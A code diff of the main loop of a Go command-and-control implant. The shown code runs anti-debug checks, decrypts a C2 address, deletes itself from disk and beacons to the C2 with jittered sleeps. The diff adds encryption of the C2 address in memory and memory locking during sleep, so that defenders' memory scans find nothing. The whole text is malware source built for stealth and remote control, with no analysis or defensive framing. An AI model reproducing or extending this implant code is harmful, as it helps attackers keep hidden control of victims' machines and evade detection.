@@ -24,7 +24,7 @@ const (
 func main() {
 	fmt.Printf("[IMPLANT] Starting on %s/%s\n", runtime.GOOS, runtime.GOARCH)
 
-	// Anti-debug (macOS only, no-op on other platforms or cross-compiles)
+	// Anti-debug (macOS only when compiled natively with cgo)
 	evasion.AntiDebug()
 
 	// Decrypt C2 address at runtime
@@ -40,11 +40,26 @@ func main() {
 		fmt.Println("[IMPLANT] Removed from disk")
 	}
 
+	// Derive memory encryption key and store C2 address in a secure buffer
+	memKey := evasion.DeriveKey([]byte(encKey))
+	secBuf, err := evasion.NewSecureBuffer(256)
+	if err != nil {
+		fmt.Println("[IMPLANT] Secure alloc failed")
+		return
+	}
+	defer secBuf.Wipe()
+	secBuf.Write([]byte(c2Address))
+
 	for {
-		session(c2Address)
-		// Jittered sleep to avoid predictable beaconing
+		addr := secBuf.String()
+		session(addr)
+
+		// Connection lost: lock memory, jitter sleep, unlock for next attempt
 		jitter := time.Duration(minJitter+rand.Intn(maxJitter-minJitter)) * time.Second
-		time.Sleep(jitter)
+		fmt.Printf("[IMPLANT] Sleeping %v (locked)\n", jitter)
+		if err := secBuf.Sleep(memKey, jitter); err != nil {
+			fmt.Printf("[IMPLANT] Sleep error: %v\n", err)
+		}
 	}
 }
 
